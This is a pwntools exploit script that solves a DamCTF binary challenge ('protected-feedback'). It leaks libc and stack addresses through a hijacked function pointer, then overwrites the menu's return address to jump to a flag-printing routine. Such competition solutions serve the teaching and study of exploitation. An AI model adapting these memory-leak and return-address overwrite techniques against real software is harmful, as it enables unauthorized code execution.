from pwn import *


debug = 0

if(debug):
	r = process("./protected-feedback")
	#gdb.attach(r)
	puts_off = 0x00000000000875a0
	environ_off = 0x00000000001ef2e0
else:
	r = remote("chals.damctf.xyz", 31781)
	puts_off = 0x0000000000080aa0
	environ_off = 0x00000000003ee098




r.recvuntil(b'2. Quit')


puts = 0x402080
read_rating = 0x402f70
#print_rating = 0x402b20
print_rating = 0x402f58

puts_got = 0x406040
#puts_got = 0x406048  # tmp




# leak libc addr
payload = b'3\x00' + p64(0)*2
payload += p64(print_rating)[:3] 

r.sendline(payload)
r.recvuntil(b'Input arg1 (if needed)')

payload = puts_got
r.sendline(str(payload).encode("utf-8"))
r.recvuntil(b'Input arg2 (if needed)')

payload = b'any' 
r.sendline(payload)

stuff = r.recvuntil(b'2. Quit').split(b'/')[0].split(b' ')[1]
stuff = int(stuff)
libc_base = stuff - puts_off
environ = libc_base + environ_off
print("libc_base: " + hex(libc_base))



# leak stack addr
payload = b'3\x00' + p64(0)*2
payload += p64(print_rating)[:3] 

r.sendline(payload)
r.recvuntil(b'Input arg1 (if needed)')

payload = environ
r.sendline(str(payload).encode("utf-8"))
r.recvuntil(b'Input arg2 (if needed)')

payload = b'any' 
r.sendline(payload)

stuff = r.recvuntil(b'2. Quit').split(b'/')[0].split(b' ')[1]
stuff = int(stuff)
ret = stuff - 0x120
print("stack ret 0f menu: " + hex(ret))


'''
# check return address position
payload = b'3\x00' + p64(0)*2
payload += p64(print_rating)[:3] 

r.sendline(payload)
r.recvuntil(b'Input arg1 (if needed)')

payload = ret + 16
r.sendline(str(payload).encode("utf-8"))
r.recvuntil(b'Input arg2 (if needed)')

payload = b'any' 
r.sendline(payload)

stuff = r.recvuntil(b'2. Quit')
print(stuff)
'''



# overwrite return address of menu
r.sendline(b'2\x00')
r.recvuntil(b'Input arg1 (if needed)')
r.sendline(b'any')
r.recvuntil(b'Input arg2 (if needed)')
r.sendline(b'any')

print(r.recvuntil(b'Where do you want to write?'))
r.sendline(str(ret + 16).encode("utf-8"))
print(r.recvuntil(b'What do you want to write?'))

flag = 0x402ede
main20 = 0x402f44

#flag2lastbyte = 0x2ede 
r.sendline(str(flag).encode("utf-8"))


r.interactive()